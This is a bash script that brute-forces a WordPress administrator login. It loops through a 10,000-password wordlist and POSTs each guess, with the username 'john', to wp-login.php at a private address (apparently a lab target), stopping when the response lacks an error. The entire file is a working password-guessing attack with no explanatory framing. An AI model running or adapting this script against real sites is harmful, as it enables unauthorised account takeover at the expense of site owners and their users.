#!/bin/bash
wordlist=/usr/share/wordlists/top-10000.txt
username="john"
count=$(wc -l $wordlist | cut -d " " -f1)
tries=1
while read p; do
	printf "($tries/$count): Trying $p\r"
	result=$(curl -s -d "log=$username&pwd=$p&wp-submit=Log+In&redirect_to=%2Fbackup_wordpress%2Fwp-admin%2F&testcookie=1" -X POST http://10.0.2.12/backup_wordpress/wp-login.php --cookie "wordpress_test_cookie=WP+Cookie+check")
	check=$(echo $result | grep "ERROR")
	if [ -z "$check" ]; then
		printf "\r\033[K"
		echo "Password for $username found in $tries tries: $p"
		break
	fi
	printf "\r\033[K"
	if [ "$count" -eq "$tries" ]; then
		echo "No password found"
	fi
	tries=$((tries+1))
done <$wordlist
